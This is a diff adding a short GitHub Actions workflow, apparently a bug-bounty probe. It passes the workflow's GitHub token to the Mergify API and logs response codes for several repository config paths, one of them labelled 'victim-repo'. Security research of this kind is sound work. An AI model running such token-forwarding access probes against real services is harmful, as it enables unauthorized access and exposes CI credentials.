@@ -1,0 +1,33 @@
+name: BB GitHub Actions token classification
+
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - "bb-ghs-token/**"
+
+permissions:
+  contents: read
+
+jobs:
+  classify:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Compare repository-scoped token against Mergify
+        env:
+          GH_ACTION_TOKEN: ${{ github.token }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          for path in \
+            /v1/repos/mgfidorlabri \
+            /v1/repos/mgfidorlabri/victim-repo/config \
+            /v1/repos/mgfidorlabri/bb-private-proxy-test/config
+          do
+            status=$(curl --silent --show-error --output /dev/null --write-out '%{http_code}' \
+              --header "Authorization: Bearer ${GH_ACTION_TOKEN}" \
+              --header 'Accept: application/json' \
+              "https://api.mergify.com${path}")
+            echo "MERGIFY_GHS_STATUS ${path} ${status}"
+          done
